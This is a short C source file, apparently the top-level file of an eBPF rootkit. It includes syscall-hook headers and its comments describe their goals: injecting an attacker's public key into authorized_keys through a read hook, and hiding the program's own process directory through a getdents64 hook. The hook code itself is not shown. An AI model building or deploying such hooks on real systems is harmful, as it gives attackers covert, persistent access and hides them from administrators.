#include "./common.h"

//get target file fd
#include "./syscall_openat.bpf.h"

#include "./syscall_exit.bpf.h"

// write our pub key into .authorized_keys
#include "./syscall_read.bpf.h"

//hide self pid directory
#include "./syscall_getdents64.bpf.h"

char LICENSE[] SEC("license") = "GPL";
